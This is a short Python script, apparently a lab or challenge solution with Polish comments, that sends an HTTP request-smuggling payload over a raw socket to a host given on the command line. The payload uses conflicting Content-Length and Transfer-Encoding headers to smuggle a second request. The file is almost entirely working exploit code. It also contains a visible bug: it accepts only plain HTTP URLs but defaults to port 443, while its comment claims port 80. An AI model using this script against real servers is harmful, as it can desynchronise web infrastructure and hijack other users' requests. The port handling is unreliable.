import socket
import sys

def send_smuggled_request(host, port):
    # Surowe żądanie HTTP z request smuggling
    raw_request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 35\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /404 HTTP/1.1\r\n"
        "X-Ignore: X\r\n"
        "\r\n"
    )

    # Otwarcie połączenia TCP
    with socket.create_connection((host, port)) as sock:
        sock.sendall(raw_request.encode())
        response = sock.recv(4096)
        print(response.decode())

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    # Parsowanie URL-a
    url = sys.argv[1]
    if not url.startswith("http://"):
        print("Only HTTP URLs are supported.")
        sys.exit(1)

    url = url[7:]  # Usuwanie "http://"
    host, _, port_path = url.partition("/")
    port = 443
    if ":" in host:
        host, port = host.split(":", 1)
        port = int(port)
    port = port or 443  # Domyślny port 80

    send_smuggled_request(host, port)
